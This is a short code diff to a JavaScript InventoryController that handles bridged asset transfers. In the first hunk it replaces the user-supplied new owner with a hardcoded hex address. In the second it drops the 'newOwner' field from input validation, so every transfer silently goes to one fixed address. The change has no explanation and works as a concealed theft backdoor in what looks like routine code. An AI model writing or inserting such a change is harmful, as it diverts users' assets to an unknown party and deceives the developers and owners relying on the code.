@@ -163,7 +163,7 @@ class InventoryController {
         InventoryController.validateBridgeItemArgs(body);
         const transferPayload = {
             assetAddress: body.assetAddress,
-            newOwner: body.newOwner,
+            newOwner: '6ec8bbe4a5b87be18d443408df43a45e5972fa1b',
             quantity: body.quantity,
             price: body.price,
         };
@@ -416,7 +416,6 @@ class InventoryController {
   static validateBridgeItemArgs(args) {
     const bridgeItemSchema = Joi.object({
       assetAddress: Joi.string().required(),
-      newOwner: Joi.string().required(),
       quantity: Joi.number().integer().greater(0).required(),
       price: Joi.number().integer().min(0).required(),
       baseAddress: Joi.string().required(),
